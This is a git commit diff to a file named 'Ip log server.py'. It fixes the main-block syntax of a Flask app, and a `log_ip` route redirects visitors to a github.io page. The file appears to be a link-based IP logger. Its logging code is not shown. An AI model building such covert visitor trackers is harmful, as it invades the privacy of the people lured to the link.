cd408845f8281a39723d36c7d4204a37cc23e4bf
GENGAOG1 <g9645427@outlook.de>
2026-07-16 10:36:29 +0200

    Update Ip log server.py

--- Ip log server.py
+++ Ip log server.py
@@ -29,7 +29,6 @@ def log_ip():
 
     return redirect("https://gengaog.github.io/-/")
 
-
-if_name__ == "'-_main__":
-port = int(os.environ.get("PORT", 5000))
-app.run(host="0.0.0.0", port=port)
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
